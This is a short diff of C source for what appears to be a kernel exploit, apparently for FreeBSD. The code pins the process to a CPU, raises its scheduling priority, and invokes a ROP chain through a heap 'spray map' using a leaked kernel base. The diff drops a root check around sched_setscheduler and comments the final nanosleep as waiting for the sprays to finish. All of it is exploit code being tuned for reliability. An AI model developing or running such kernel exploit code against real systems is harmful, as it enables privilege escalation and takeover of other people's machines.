@@ -1,5 +1,4 @@
-#include <sched.h>  // Added for sched_setscheduler if root
-#include <sys/resource.h> // Added for setpriority if root
+#include <sched.h>  // Added for sched_setscheduler
 #include <sys/types.h>
 #include <stdio.h>
 #include <sys/socket.h>
@@ -207,12 +206,8 @@ void pin_to_cpu(int cpu) {
     CPU_SET(cpu, &set);
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
 
-    if (geteuid() == 0) {
-        struct sched_param sp = { .sched_priority = 70 }; // Depends on root access
-        sched_setscheduler(0, SCHED_RR, &sp);
-    } else {
-        setpriority(PRIO_PROCESS, 0, -20); // Alternative if root access is granted
-    }
+    struct sched_param sp = { .sched_priority = 70 };
+    sched_setscheduler(0, SCHED_RR, &sp);
 }
 
 // External inputs from gadgets and ROP buffers
@@ -332,6 +327,6 @@ int main() {
         pin_to_cpu(cpu);
         rop_call_funcptr(spray_map, NULL, kernel_base);
     }
-        nanosleep("\0\0\0\0\0\0\0\0\x80\x17\xB4\x2C\0\0\0\0", NULL);
+        nanosleep("\0\0\0\0\0\0\0\0\x80\x17\xB4\x2C\0\0\0\0", NULL); // Ensure Mallocs Sprays are concluded before exiting
     return 0;
 }
